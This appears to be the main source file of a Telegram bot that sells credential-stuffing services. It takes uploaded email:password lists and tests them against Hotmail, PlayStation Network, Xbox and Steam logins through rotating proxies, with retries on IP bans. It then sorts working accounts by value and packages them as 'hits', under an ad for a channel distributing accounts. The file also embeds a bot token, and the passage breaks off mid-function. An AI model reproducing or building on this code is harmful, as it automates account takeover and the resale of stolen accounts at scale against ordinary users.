# language: Python 3.10+, file: bot.py
# pip install python-telegram-bot==22.3 requests cfonts

import asyncio
try:
    asyncio.get_event_loop()
except RuntimeError:
    asyncio.set_event_loop(asyncio.new_event_loop())

import io, os, re, json, time, uuid, html, random, zipfile, threading
import collections
from pathlib import Path
from queue import Queue
from datetime import datetime, timezone
from http.server import BaseHTTPRequestHandler, HTTPServer

from telegram import (
    Update, InlineKeyboardButton, InlineKeyboardMarkup,
    InputFile, BotCommand
)
from telegram.constants import ParseMode
from telegram.ext import (
    Application, CommandHandler, MessageHandler, CallbackQueryHandler,
    ContextTypes, filters
)

from h import HotmailChecker, LoginError, SERVICE_SENDERS, Stats
from psn import PSNChecker
from xbox import check_xbox
from steam import check_steam

# ============ FAKE WEB SERVER (Render ke liye) ============
def run_fake_server():
    port = int(os.environ.get("PORT", 8080))
    class Handler(BaseHTTPRequestHandler):
        def do_GET(self):
            self.send_response(200)
            self.end_headers()
            self.wfile.write(b"Bot is running")
        def log_message(self, format, *args):
            pass
    server = HTTPServer(("0.0.0.0", port), Handler)
    server.serve_forever()

# ── Stats 2fa patch ────────────────────────────────────────────────────────
_orig_stats_init = Stats.__init__
def _patched_stats_init(self):
    _orig_stats_init(self)
    self.twofa = 0
Stats.__init__ = _patched_stats_init

_orig_stats_update = Stats.update
def _patched_stats_update(self, stat_type):
    _orig_stats_update(self, stat_type)
    if stat_type == "2fa":
        self.twofa += 1
Stats.update = _patched_stats_update

# ── config ──────────────────────────────────────────────────────────────────
BOT_TOKEN   = "8827690896:AAEc2zWdVGjkS1a_9Rgaz7whhOf-aiJ5Gjo"
OWNER_ID    = 7578158962
OWNER_TAG   = "@Remo_god7"
MAX_THREADS = 7
RESULTS_DIR   = Path("results");        RESULTS_DIR.mkdir(exist_ok=True)
KEYS_FILE     = Path("keys.json")
USERS_FILE    = Path("users.json")
EXTRA_FILE    = Path("extra_targets.json")
FREES_FILE    = Path("frees.json")
LOGO_FILE     = Path("logo.png")

CHANNEL_URL   = "https://t.me/JoinThePiratesCloud"
CHANNEL_NAME  = "JoinThePiratesCloud"
CHANNEL_ID    = "@JoinThePiratesCloud"

CHAT_URL      = "https://t.me/JoinPiratesCloudChat"
CHAT_NAME     = "JoinPiratesCloudChat"
CHAT_ID       = "@JoinPiratesCloudChat"

FREE_LIMITS = {
    "hotmail": 5000,
    "xbox":    500,
    "psn":     500,
    "steam":   200,
}

ADS_HEADER = """Shiver Me Timbers 🏴‍☠️
🔥🔥🔥JOIN FOR DAILY PREMIUM DROPS 🔥🔥
🎮XBOX ACCOUNTS 🎮
📲STREAMING ACCOUNTS 📲
🎰GOOD QUALITY HOTMAILS 🎰
💥METHODS 💥
⚡AND MANY MORE PREMIUMS DROPS ⚡

Owner :- @Remo_god7

Group Chat :- @JoinPiratesCloudChat

🚨The content shared in this channel is for educational purpose only !!
https://t.me/JoinThePiratesCloud

────────────────────────────────────────────────────────
"""

SPINNER = ["⠋","⠙","⠹","⠸","⠼","⠴","⠦","⠧","⠇","⠏"]

def bar(done, total, width=10):
    if total <= 0: return "▱" * width
    filled = int(width * done / total)
    return "▰" * filled + "▱" * (width - filled)

def spin(i): return SPINNER[i % len(SPINNER)]

def fmt_eta(s):
    if s < 60:   return f"{int(s)}s"
    if s < 3600: return f"{int(s//60)}m {int(s%60)}s"
    return f"{int(s//3600)}h {int((s%3600)//60)}m"

def fmt_until(ts):
    if ts is None: return "never"
    now = time.time()
    if ts <= now: return "expired"
    d = ts - now
    if d < 3600: return f"{int(d//60)}m"
    if d < 86400: return f"{int(d//3600)}h {int((d%3600)//60)}m"
    return f"{int(d//86400)}d {int((d%86400)//3600)}h"

def parse_duration(text: str) -> int:
    t = (text or "").strip().lower().replace(" ", "")
    if not t: return 0
    if t.isdigit(): return int(t) * 3600
    total = 0
    for m in re.finditer(r"(\d+)([dh])", t):
        n, unit = int(m.group(1)), m.group(2)
        total += n * (86400 if unit == "d" else 3600)
    return total

# ── storage ─────────────────────────────────────────────────────────────────
_store_lock = threading.Lock()

def _load(path, default):
    if not path.exists(): return default
    try:
        with open(path, "r", encoding="utf-8") as f: return json.load(f)
    except Exception: return default

def _save(path, data):
    with _store_lock:
        tmp = path.with_suffix(".tmp")
        with open(tmp, "w", encoding="utf-8") as f: json.dump(data, f, indent=2)
        tmp.replace(path)

def load_keys():  return _load(KEYS_FILE, {})
def save_keys(k): _save(KEYS_FILE, k)
def load_users(): return _load(USERS_FILE, {})
def save_users(u):_save(USERS_FILE, u)
def load_extra(): return _load(EXTRA_FILE, [])
def save_extra(e):_save(EXTRA_FILE, e)

def register_user(update):
    u = update.effective_user
    if not u: return
    users = load_users()
    uid = str(u.id)
    e = users.get(uid, {})
    e["first_seen"] = e.get("first_seen", time.time())
    e["last_seen"]  = time.time()
    e["username"]   = u.username or ""
    e["name"]       = (u.full_name or "").strip()
    e.setdefault("until", 0)
    e.setdefault("redeemed", [])
    e.setdefault("proxies", [])
    e.setdefault("proxy_type", "http")
    users[uid] = e
    save_users(users)

# ── per-user proxy storage ─────────────────────────────────────────────────
def user_proxies(uid: int) -> list:
    users = load_users()
    u = users.get(str(uid), {})
    return list(u.get("proxies", []))

def user_proxy_type(uid: int) -> str:
    users = load_users()
    u = users.get(str(uid), {})
    return u.get("proxy_type", "http")

def set_user_proxies(uid: int, proxies: list, ptype: str = None):
    users = load_users()
    key = str(uid)
    users.setdefault(key, {})
    users[key]["proxies"] = list(proxies)[:500]
    if ptype:
        users[key]["proxy_type"] = ptype
    save_users(users)

def add_user_proxies(uid: int, new_proxies: list, ptype: str = None):
    cur = user_proxies(uid)
    seen = set(cur)
    for p in new_proxies:
        if p not in seen:
            cur.append(p); seen.add(p)
            if len(cur) >= 500: break
    set_user_proxies(uid, cur, ptype)

def clear_user_proxies(uid: int):
    set_user_proxies(uid, [])

def pick_proxy(uid: int):
    ps = user_proxies(uid)
    if not ps:
        return None
    return random.choice(ps)

def proxy_dict_for_requests(uid: int):
    p = pick_proxy(uid)
    if not p:
        return None
    ptype = user_proxy_type(uid)
    if "://" in p:
        url = p
    else:
        url = f"{ptype}://{p}"
    return {"http": url, "https": url}

def gen_key(seconds=0, uses=1):
    if seconds <= 0: seconds = 3600
    token = uuid.uuid4().hex[:12].upper()
    key = f"PIRATE-{token[:4]}-{token[4:8]}-{token[8:12]}"
    keys = load_keys()
    keys[key] = {"duration": int(seconds), "uses_left": int(uses),
                 "created": time.time(), "used_by": []}
    save_keys(keys)
    return key

def redeem_key(user_id, key):
    keys = load_keys()
    if key not in keys: return False, "❌ Invalid key."
    e = keys[key]
    if e["uses_left"] <= 0: return False, "❌ Key already used up."
    users = load_users(); uid = str(user_id); now = time.time()
    base = users.get(uid, {}).get("until", 0)
    if base < now: base = now
    new_until = base + e["duration"]
    users.setdefault(uid, {})
    users[uid]["until"] = new_until
    users[uid]["redeemed"] = users[uid].get("redeemed", []) + [key]
    users[uid]["last_seen"] = now
    save_users(users)
    e["uses_left"] -= 1
    e["used_by"].append({"uid": user_id, "at": now})
    save_keys(keys)
    return True, fmt_until(new_until)

def has_access(user_id):
    if user_id == OWNER_ID: return True
    users = load_users()
    u = users.get(str(user_id))
    return bool(u and u.get("until", 0) > time.time())

def user_status(user_id):
    if user_id == OWNER_ID:
        return {"role": "OWNER", "until": None, "keys": []}
    users = load_users()
    u = users.get(str(user_id), {})
    return {"role": "USER", "until": u.get("until", 0), "keys": u.get("redeemed", [])}

def broadcast_targets():
    out = set()
    for uid_s in load_users().keys():
        try:
            v = int(uid_s)
            if v != OWNER_ID: out.add(v)
        except Exception: pass
    for v in load_extra():
        try:
            v = int(v)
            if v != OWNER_ID: out.add(v)
        except Exception: pass
    return list(out)

# ── membership gate ─────────────────────────────────────────────────────────
async def _is_member(bot, chat_id: str, user_id: int) -> bool:
    try:
        m = await bot.get_chat_member(chat_id=chat_id, user_id=user_id)
        return m.status in ("member", "administrator", "creator")
    except Exception:
        return False

async def _check_join(bot, user_id: int):
    if user_id == OWNER_ID:
        return True, True
    in_channel = await _is_member(bot, CHANNEL_ID, user_id)
    in_chat    = await _is_member(bot, CHAT_ID,    user_id)
    return in_channel, in_chat

async def _send_join_gate(update, ctx, in_channel: bool, in_chat: bool):
    missing = []
    if not in_channel: missing.append("📢 <b>Channel</b>")
    if not in_chat:    missing.append("💬 <b>Discussion Group</b>")
    text = (
        f"🔒 <b>Join required</b>\n"
        f"━━━━━━━━━━━━━━━━━━━━━━\n"
        f"You must join our community to use this bot.\n\n"
        f"Missing:\n• " + "\n• ".join(missing) + "\n\n"
        f"Tap the buttons below, then press <b>✅ Verify</b>."
    )
    kb = InlineKeyboardMarkup([
        [InlineKeyboardButton("📢 Join Channel",  url=CHANNEL_URL)],
        [InlineKeyboardButton("💬 Join Chat",     url=CHAT_URL)],
        [InlineKeyboardButton("✅ Verify",         callback_data="verify_join")],
    ])
    if update.callback_query:
        try:
            await update.callback_query.message.reply_text(
                text, parse_mode=ParseMode.HTML,
                reply_markup=kb, disable_web_page_preview=True)
        except Exception: pass
    else:
        await update.message.reply_text(
            text, parse_mode=ParseMode.HTML,
            reply_markup=kb, disable_web_page_preview=True)

async def _require_join(update, ctx) -> bool:
    uid = update.effective_user.id if update.effective_user else 0
    in_channel, in_chat = await _check_join(ctx.bot, uid)
    if in_channel and in_chat: return True
    await _send_join_gate(update, ctx, in_channel, in_chat)
    return False

# ── daily free-tier quota ───────────────────────────────────────────────────
def _today_utc() -> str:
    return datetime.now(timezone.utc).strftime("%Y-%m-%d")

def _load_frees() -> dict: return _load(FREES_FILE, {})
def _save_frees(d: dict):  _save(FREES_FILE, d)

def _quota_state(uid: int) -> dict:
    frees = _load_frees()
    key = str(uid)
    today = _today_utc()
    e = frees.get(key, {})
    if e.get("date") != today:
        e = {"date": today, "used": {m: 0 for m in FREE_LIMITS}}
        frees[key] = e
        _save_frees(frees)
    for m in FREE_LIMITS: e["used"].setdefault(m, 0)
    return e

def quota_remaining(uid: int, mode: str):
    if uid == OWNER_ID: return None
    if has_access(uid): return None
    e = _quota_state(uid)
    limit = FREE_LIMITS.get(mode, 0)
    used = e["used"].get(mode, 0)
    return max(0, limit - used)

def quota_consume(uid: int, mode: str, lines: int):
    if uid == OWNER_ID: return
    if has_access(uid): return
    frees = _load_frees()
    key = str(uid)
    today = _today_utc()
    e = frees.get(key, {})
    if e.get("date") != today:
        e = {"date": today, "used": {m: 0 for m in FREE_LIMITS}}
    for m in FREE_LIMITS: e["used"].setdefault(m, 0)
    e["used"][mode] = e["used"].get(mode, 0) + int(lines)
    frees[key] = e
    _save_frees(frees)

def _quota_banner(uid: int, mode: str) -> str:
    rem = quota_remaining(uid, mode)
    if rem is None: return "♾ <b>Unlimited</b>"
    lim = FREE_LIMITS.get(mode, 0)
    return f"🎟 <b>Free tier</b> — <code>{rem}/{lim}</code> lines left today"

# ── priority queue ──────────────────────────────────────────────────────────
QUEUE_LOCK = threading.Lock()
FREE_QUEUE: collections.deque = collections.deque()
ACTIVE_PREMIUM = 0
MAX_PREMIUM_PARALLEL = 3
ACTIVE_FREE = False
_BOT_REF = None

def set_bot_ref(b):
    global _BOT_REF
    _BOT_REF = b

def queue_position(chat_id: int) -> int:
    with QUEUE_LOCK:
        for i, item in enumerate(FREE_QUEUE):
            if item[0] == chat_id: return i + 1
        return 0

def queue_len() -> int:
    with QUEUE_LOCK: return len(FREE_QUEUE)

# ── zip builders ────────────────────────────────────────────────────────────
def build_hotmail_files(hits, checker, keywords=None):
    files = {}
    mode_label = "CUSTOM KEYWORDS" if keywords else "DEFAULT SERVICES"
    master = [ADS_HEADER,
              f"# HOTMAIL INBOXER — ALL HITS ({mode_label})",
              f"# Checked by: {checker}",
              f"# Generated: {datetime.now()}",
              f"# Total hits: {len(hits)}",
              "# Format: email:password | Name | Country | Birthday | Matched",
              ""]
    for i, h in enumerate(hits, 1):
        p = h["profile"]
        svc = ", ".join(f"{k}({v['total']})" for k, v in h["results"].items())
        master.append(
            f"{i:03d}. {h['email']}:{h['pass']} | "
            f"Name={p.get('Name','—')} | Country={p.get('Country','—')} | "
            f"Birthday={p.get('Birthday','—')} | {svc}"
        )
    files["all_hits.txt"] = "\n".join(master) + "\n"

    buckets = {}
    for h in hits:
        for svc, data in h["results"].items():
            buckets.setdefault(svc, []).append({"hit": h, "msgs": data["total"]})
    for svc, rows in buckets.items():
        safe = "".join(c for c in svc if c.isalnum() or c in " -_@.").strip() or "misc"
        lines = [ADS_HEADER,
                 f"# {svc} — {len(rows)} hits",
                 f"# Checked by: {checker}",
                 f"# Generated: {datetime.now()}",
                 "# Format: NNN. email:password | Name | Country | Birthday | Msgs",
                 ""]
        for i, r in enumerate(rows, 1):
            h = r["hit"]; p = h["profile"]
            lines.append(
                f"{i:03d}. {h['email']}:{h['pass']} | "
                f"Name={p.get('Name','—')} | Country={p.get('Country','—')} | "
                f"Birthday={p.get('Birthday','—')} | Msgs={r['msgs']}"
            )
        files[f"{safe}.txt"] = "\n".join(lines) + "\n"
    return files

def build_psn_files(hits, checker):
    files = {}
    psn_lines = [ADS_HEADER,
                 "# PSN CHECKER — PSN ACCOUNTS (orders > 0)",
                 f"# Checked by: {checker}",
                 f"# Generated: {datetime.now()}",
                 "",
                 "# Format: NNN. email:password | Orders | Birthday | Age | Top purchase",
                 ""]
    free_lines = [ADS_HEADER,
                  "# PSN CHECKER — FREE (valid login, no Sony orders)",
                  f"# Checked by: {checker}",
                  f"# Generated: {datetime.now()}",
                  "",
                  "# Format: NNN. email:password | Birthday | Age",
                  ""]
    all_master = [ADS_HEADER,
                  "# PSN CHECKER — ALL VALID LOGINS",
                  f"# Checked by: {checker}",
                  f"# Generated: {datetime.now()}",
                  f"# Total valid: {len(hits)}",
                  "# Format: email:password | PSN status | Orders",
                  ""]

    psn_n = 0; free_n = 0
    for h in hits:
        bd   = h.get("birthday", "Unknown")
        age  = h.get("age", "Unknown")
        orders = h.get("psn_orders", 0)
        status = h.get("psn_status", "FREE")
        all_master.append(f"{h['email']}:{h['pass']} | PSN={status} | Orders={orders}")
        if orders > 0:
            psn_n += 1
            top = ""
            ps = h.get("psn_purchases") or []
            if ps and ps[0].get("item"): top = ps[0]["item"][:50]
            psn_lines.append(
                f"{psn_n:03d}. {h['email']}:{h['pass']} | "
                f"Orders={orders} | Birthday={bd} | Age={age}"
                + (f" | Top={top}" if top else "")
            )
        else:
            free_n += 1
            free_lines.append(
                f"{free_n:03d}. {h['email']}:{h['pass']} | Birthday={bd} | Age={age}"
            )

    files["psn_hits.txt"] = "\n".join(psn_lines) + "\n"
    files["free.txt"] = "\n".join(free_lines) + "\n"
    files["all_hits.txt"] = "\n".join(all_master) + "\n"
    return files

def _classify_xbox(r):
    t = r.get("type", "xbox")
    if t in ("Xbox Game Pass Ultimate", "Xbox Game Pass Premium",
             "Xbox Game Pass Essential", "Xbox Game Pass"): return "GamePass"
    if t == "Minecraft": return "Minecraft"
    if t == "gscore":    return "GScore"
    if t == "not_linked":return "NotLinked"
    if t == "2fa":       return "2FA"
    return "Xbox"

def _xbox_block(idx, h, checker):
    lines = [
        f"#{idx}",
        f"Email         : {h.get('email','?')}",
        f"Password      : {h.get('password','?')}",
        f"Gamertag      : {h.get('gamertag','N/A')}",
        f"Tier          : {h.get('tier','N/A')}",
        f"Reputation    : {h.get('rep','N/A')}",
        f"Gamerscore    : {h.get('gamerscore','0')}",
        f"MC Name       : {h.get('name','N/A')}",
        f"UUID          : {h.get('uuid','N/A')}",
        f"Capes         : {h.get('capes','None')}",
        f"Type          : {h.get('type','N/A')}",
        f"Subscriptions : {h.get('subscriptions','None')}",
    ]
    games = h.get("games") or []
    if games:
        lines.append("Games G-Score:")
        for g in games: lines.append(f" - {g}")
    lines.append(f"Captured By   : {checker}")
    lines.append("-" * 50)
    lines.append("")
    return lines

def build_xbox_files(hits, checker):
    files = {}
    master_lines = [ADS_HEADER,
                    "# XBOX CHECKER — ALL HITS",
                    f"# Checked by: {checker}",
                    f"# Generated: {datetime.now()}",
                    f"# Total hits: {len(hits)}",
                    "=" * 60, ""]
    for i, h in enumerate(hits, 1):
        master_lines.extend(_xbox_block(i, h, checker))
    files["all_hits.txt"] = "\n".join(master_lines) + "\n"

    buckets = {}
    for h in hits: buckets.setdefault(_classify_xbox(h), []).append(h)

    for cat, rows in buckets.items():
        safe = cat.replace(" ", "")
        lines = [ADS_HEADER,
                 f"# XBOX — {cat} ({len(rows)} hits)",
                 f"# Checked by: {checker}",
                 f"# Generated: {datetime.now()}",
                 "=" * 60, ""]
        for i, h in enumerate(rows, 1):
            lines.extend(_xbox_block(i, h, checker))
        files[f"{safe}.txt"] = "\n".join(lines) + "\n"
    return files

def _steam_block(idx, h, checker):
    lines = [
        f"#{idx}",
        f"Username      : {h.get('email','?')}",
        f"Password      : {h.get('password','?')}",
        f"SteamID       : {h.get('steam_id','?')}",
        f"Level         : {h.get('level') or '?'}",
        f"Games         : {h.get('games', 0)}",
        f"Wallet        : {h.get('balance') or 'N/A'}",
        f"Country       : {h.get('country') or h.get('cc','?')}",
    ]
    gl = h.get("game_list") or []
    if gl:
        lines.append("Game List:")
        for g in gl: lines.append(f" - {g}")
    lines.append(f"Captured By   : {checker}")
    lines.append("-" * 50)
    lines.append("")
    return lines

def build_steam_files(hits, checker):
    files = {}
    master_lines = [ADS_HEADER,
                    "# STEAM CHECKER — ALL HITS",
                    f"# Checked by: {checker}",
                    f"# Generated: {datetime.now()}",
                    f"# Total: {len(hits)}",
                    "=" * 60, ""]
    for i, h in enumerate(hits, 1):
        master_lines.extend(_steam_block(i, h, checker))
    files["all_hits.txt"] = "\n".join(master_lines) + "\n"

    buckets = {"steam_hit": [], "steam_free": [], "steam_2fa": [], "steam_ban": []}
    for h in hits:
        t = h.get("type", "steam_hit")
        if t not in buckets: t = "steam_hit"
        buckets[t].append(h)

    names = {"steam_hit":"Steam_Hits","steam_free":"Steam_Free",
             "steam_2fa":"Steam_2FA","steam_ban":"Steam_Ban"}
    for key in ("steam_hit","steam_free","steam_2fa","steam_ban"):
        rows = buckets[key]
        if not rows: continue
        safe = names[key]
        lines = [ADS_HEADER,
                 f"# STEAM — {safe} ({len(rows)})",
                 f"# Checked by: {checker}",
                 f"# Generated: {datetime.now()}",
                 "=" * 60, ""]
        for i, h in enumerate(rows, 1):
            lines.extend(_steam_block(i, h, checker))
        files[f"{safe}.txt"] = "\n".join(lines) + "\n"
    return files

# ── jobs ────────────────────────────────────────────────────────────────────
SESSIONS: dict[int, "Job"] = {}

class Job:
    def __init__(self, chat_id, combos, app, checker_label, mode,
                 keywords=None, use_proxy=False, proxy_uid=None):
        self.chat_id = chat_id
        self.combos  = combos
        self.app     = app
        self.checker = checker_label
        self.mode    = mode
        self.keywords = keywords
        self.use_proxy = use_proxy
        self.proxy_uid = proxy_uid or chat_id
        self.queue   = Queue()
        self.lock    = threading.Lock()
        self.stats   = Stats()
        self.hits    = []
        self.psn_hits = []
        self.xbox_hits = []
        self.steam_hits = []
        self.twofa_list = []
        self.frees   = []
        self.started = time.time()
        self.status_msg_id = None
        self.running = True
        self.tick    = 0
        self.latest_hit = None
        self.service_stats = {}
        self.exported = False
        self.psn_orders_total = 0

    async def _edit(self, text, kb=None):
        try:
            if self.status_msg_id is None:
                m = await self.app.bot.send_message(
                    self.chat_id, text, parse_mode=ParseMode.HTML,
                    reply_markup=kb, disable_web_page_preview=True)
                self.status_msg_id = m.message_id
            else:
                await self.app.bot.edit_message_text(
                    chat_id=self.chat_id, message_id=self.status_msg_id,
                    text=text, parse_mode=ParseMode.HTML,
                    reply_markup=kb, disable_web_page_preview=True)
        except Exception: pass

    def _status_text(self):
        s = self.stats
        total = max(len(self.combos), 1)
        pct = (s.total / total) * 100
        elapsed = time.time() - self.started
        mins = max(elapsed / 60, 0.0001)
        cpm = s.total / mins
        remaining = len(self.combos) - s.total
        eta = remaining / (cpm / 60) if cpm > 0 else 0
        b = bar(s.total, len(self.combos), width=20)
        sp = spin(self.tick)

        titles = {"psn": "PSN CHECKER — RUNNING",
                  "xbox": "XBOX CHECKER — RUNNING",
                  "steam": "STEAM CHECKER — RUNNING",
                  "hotmail": "HOTMAIL INBOXER — RUNNING"}
        title = titles.get(self.mode, "CHECKER — RUNNING")
        if self.mode == "hotmail" and self.keywords:
            title = f"HOTMAIL INBOXER — CUSTOM KEYWORDS ({len(self.keywords)})"

        proxy_note = (f"🌐 <b>Proxy</b>: <code>on</code> · {len(user_proxies(self.proxy_uid))} loaded"
                      if self.use_proxy else "🌐 <b>Proxy</b>: <code>off</code>")

        if self.mode == "psn":
            real_psn = sum(1 for h in self.psn_hits if h.get("psn_orders", 0) > 0)
            free_psn = len(self.psn_hits) - real_psn
            hit_lines = [
                f"│   • Valid logins: <code>{len(self.psn_hits)}</code>",
                f"│   • 🎮 PSN with orders: <code>{real_psn}</code>",
                f"│   • ⚪ FREE (no orders): <code>{free_psn}</code>",
                f"│   • 🔐 2FA: <code>{s.twofa}</code>",
            ]
        elif self.mode == "xbox":
            counts = {"gamepass":0,"minecraft":0,"gscore":0,"notlinked":0,"xbox":0}
            for h in self.xbox_hits:
                t = h.get("type","xbox")
                if t in ("Xbox Game Pass Ultimate","Xbox Game Pass Premium",
                         "Xbox Game Pass Essential","Xbox Game Pass"):
                    counts["gamepass"] += 1
                elif t == "Minecraft": counts["minecraft"] += 1
                elif t == "gscore":    counts["gscore"] += 1
                elif t == "not_linked":counts["notlinked"] += 1
                else: counts["xbox"] += 1
            hit_lines = [
                f"│   • 👑 Ultimate/Premium: <code>{counts['gamepass']}</code>",
                f"│   • ⛏️ Minecraft: <code>{counts['minecraft']}</code>",
                f"│   • 🏆 G-Score only: <code>{counts['gscore']}</code>",
                f"│   • 🔓 Not linked: <code>{counts['notlinked']}</code>",
                f"│   • 🕹️ Xbox: <code>{counts['xbox']}</code>",
                f"│   • 🔐 2FA: <code>{s.twofa}</code>",
            ]
        elif self.mode == "steam":
            counts = {"steam_hit":0,"steam_free":0,"steam_2fa":0,"steam_ban":0}
            for h in self.steam_hits:
                t = h.get("type","steam_hit")
                if t not in counts: t = "steam_hit"
                counts[t] += 1
            hit_lines = [
                f"│   • 🎮 Valid: <code>{counts['steam_hit']}</code>",
                f"│   • 🆓 Free: <code>{counts['steam_free']}</code>",
                f"│   • 🔐 2FA: <code>{counts['steam_2fa']}</code>",
                f"│   • 🚫 Banned: <code>{counts['steam_ban']}</code>",
            ]
        else:
            hit_lines = []
            if self.service_stats:
                for svc, cnt in sorted(self.service_stats.items(), key=lambda x: -x[1]):
                    hit_lines.append(f"│   • {svc}: <code>{cnt}</code>")
            else:
                hit_lines.append("│   <i>no matches yet</i>")

        if self.latest_hit:
            lh = self.latest_hit
            if self.mode == "psn":
                orders = lh.get("psn_orders", 0)
                sub = f"PSN:{orders}" if orders > 0 else "FREE (no orders)"
            elif self.mode == "xbox":   sub = lh.get("type", "Xbox")
            elif self.mode == "steam":  sub = lh.get("type", "steam")
            else: sub = next(iter(lh["results"].keys()), "—")
            latest_block = (
                f"│ 🔒 <code>{html.escape(lh.get('email', lh.get('password','?')))}</code>\n"
                f"│   └ <b>{html.escape(str(sub))}</b>"
            )
        else:
            latest_block = "│ <i>waiting…</i>"

        return (
            f"{sp} <b>{title}</b>\n"
            f"👤 <b>Checked by</b>: <code>{html.escape(self.checker)}</code>\n"
            f"{proxy_note}\n"
            f"┌────────────────────────────┐\n"
            f"│ ⚡ <b>Speed</b>: <code>{cpm:5.1f}</code> checks/min\n"
            f"│ ⏱ <b>Elapsed</b>: <code>{fmt_eta(elapsed)}</code>\n"
            f"│ ⌛ <b>ETA</b>: <code>{fmt_eta(eta)}</code>\n"
            f"└────────────────────────────┘\n"
            f"┌────────────────────────────┐\n"
            f"│ 📊 <b>Progress</b>\n"
            f"│ <code>{b}</code> {pct:5.1f}%\n"
            f"│ <b>Checked</b>: <code>{s.total} / {len(self.combos)}</code>\n"
            f"└────────────────────────────┘\n"
            f"┌────────────────────────────┐\n"
            f"│ 🎯 <b>HITS</b> (<code>{s.hits}</code> total)\n"
            + "\n".join(hit_lines) + "\n"
            f"└────────────────────────────┘\n"
            f"┌────────────────────────────┐\n"
            f"│ ❌ Bad: <code>{s.bad}</code>\n"
            f"│ 🔐 2FA: <code>{s.twofa}</code>\n"
            f"│ ⚠️ Errors: <code>{s.retries}</code>\n"
            f"└────────────────────────────┘\n"
            f"┌────────────────────────────┐\n"
            f"│ 🔥 <b>Latest Hit</b>\n"
            f"{latest_block}\n"
            f"└────────────────────────────┘"
        )

    def _buttons(self):
        return InlineKeyboardMarkup([
            [InlineKeyboardButton("🛑 Stop", callback_data="stop")],
        ])

    def _check_hotmail(self, email, password):
        for attempt in range(2):
            try:
                c = HotmailChecker(email, password)
                if self.use_proxy:
                    pd = proxy_dict_for_requests(self.proxy_uid)
                    if pd: c.session.proxies.update(pd)
                if self.keywords:
                    kw_copy = list(self.keywords)
                    def _custom_check(checker_self=c, kws=kw_copy):
                        out = {}
                        for name in kws:
                            r = checker_self.search_emails(name)
                            if r["total"] > 0: out[name] = r
                        return out
                    c.check_all_services = _custom_check
                status, profile, results = c.run()
                return {"email": email, "pass": password,
                        "status": status, "profile": profile, "results": results}
            except LoginError as e:
                err = str(e)
                if err == "2FA":
                    return {"email": email, "pass": password, "status": "2FA",
                            "profile": {}, "results": {}}
                if err == "IP BAN" and attempt == 0:
                    self.stats.update("retry"); time.sleep(3); continue
                return {"email": email, "pass": password, "status": "BAD",
                        "profile": {}, "results": {}}
            except Exception:
                if attempt == 0:
                    self.stats.update("retry"); time.sleep(2); continue
                return {"email": email, "pass": password, "status": "BAD",
                        "profile": {}, "results": {}}

    def _check_psn(self, email, password):
        try:
            c = PSNChecker(debug=False)
            if self.use_proxy:
                pd = proxy_dict_for_requests(self.proxy_uid)
                if pd and hasattr(c, "session"):
                    c.session.proxies.update(pd)
            r = c.check(email, password)
            if r.get("status") == "HIT":
                r["email"] = email; r["pass"] = password
            return r
        except Exception:
            return {"status": "BAD", "reason": "Error"}

    def _check_xbox(self, email, password):
        try:
            proxy = None
            if self.use_proxy:
                pd = proxy_dict_for_requests(self.proxy_uid)
                if pd: proxy = pd.get("https")
            return check_xbox(email, password, proxy=proxy)
        except Exception:
            return {"success": False, "type": "error", "email": email,
                    "password": password, "error": "Error"}

    def _check_steam(self, username, password):
        try:
            proxy = None
            if self.use_proxy:
                pd = proxy_dict_for_requests(self.proxy_uid)
                if pd: proxy = pd.get("https")
            return check_steam(username, password, proxy=proxy)
        except Exception:
            return {"success": False, "type": "error", "email": username,
                    "password": password, "error": "Error"}

    def _thread_worker(self):
        while self.running:
            try:
                item = self.queue.get(timeout=1)
            except Exception: continue
            if item is None:
                self.queue.task_done(); break
            email, password = item

            if self.mode == "psn":
                r = self._check_psn(email, password)
                with self.lock:
                    if r.get("status") == "HIT":
                        self.stats.update("hit")
                        self.psn_hits.append(r); self.latest_hit = r
                        if r.get("psn_orders", 0) > 0:
                            self.psn_orders_total += r["psn_orders"]
                    elif r.get("status") == "2FA":
                        self.stats.update("2fa")
                        self.twofa_list.append({"email": email, "pass": password})
                    else: self.stats.update("bad")
            elif self.mode == "xbox":
                r = self._check_xbox(email, password)
                with self.lock:
                    if r.get("success"):
                        self.stats.update("hit")
                        self.xbox_hits.append(r); self.latest_hit = r
                    elif r.get("type") == "2fa":
                        self.stats.update("2fa")
                        self.twofa_list.append({"email": email, "pass": password})
                    else: self.stats.update("bad")
            elif self.mode == "steam":
                r = self._check_steam(email, password)
                with self.lock:
                    if r.get("success"):
                        self.stats.update("hit")
                        self.steam_hits.append(r); self.latest_hit = r
                    else: self.stats.update("bad")
            else:
                r = self._check_hotmail(email, password)
                with self.lock:
                    if r["status"] == "HIT":
                        self.stats.update("hit")
                        self.hits.append(r); self.latest_hit = r
                        for svc in r["results"]:
                            self.service_stats[svc] = self.service_stats.get(svc, 0) + 1
                    elif r["status"] == "FREE":
                        self.stats.update("free"); self.frees.append(r)
                    elif r["status"] == "2FA": self.stats.update("2fa")
                    else: self.stats.update("bad")
            self.queue.task_done()

    async def run(self):
        threads = []
        for _ in range(MAX_THREADS):
            t = threading.Thread(target=self._thread_worker, daemon=True)
            t.start(); threads.append(t)
        for c in self.combos: self.queue.put(c)

        last_total = -1
        while self.running:
            self.tick += 1
            if self.stats.total != last_total or self.tick % 3 == 0:
                await self._edit(self._status_text(), self._buttons())
                last_total = self.stats.total
            if self.queue.empty() and self.stats.total >= len(self.combos): break
            await asyncio.sleep(1.5)

        self.running = False
        for _ in threads: self.queue.put(None)

        await self._edit(self._status_text() + "\n\n🏁 <b>FINISHED</b>", self._buttons())
        await self._auto_export()

    async def _auto_export(self):
        if self.exported: return
        self.exported = True
        try:
            if self.mode == "psn":     await self._export_psn()
            elif self.mode == "xbox":  await self._export_xbox()
            elif self.mode == "steam": await self._export_steam()
            else:                      await self._export_hotmail()
        except Exception as e:
            try:
                await self.app.bot.send_message(
                    self.chat_id,
                    f"⚠️ <b>Export failed:</b> <code>{html.escape(str(e)[:200])}</code>\n"
                    f"Mode: <code>{self.mode}</code>",
                    parse_mode=ParseMode.HTML)
            except Exception: pass

    async def _export_hotmail(self):
        if not self.hits:
            await self.app.bot.send_message(self.chat_id, "📭 No hits this run.")
            return
        with self.lock: hits = list(self.hits)
        files = await asyncio.to_thread(build_hotmail_files, hits, self.checker, self.keywords)
        buf = io.BytesIO()
        with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED, compresslevel=9) as z:
            for name, content in files.items():
                z.writestr(name, content.encode("utf-8"))
        zb = buf.getvalue()
        mode_label = "custom keywords" if self.keywords else "default services"
        try:
            await self.app.bot.send_document(
                self.chat_id,
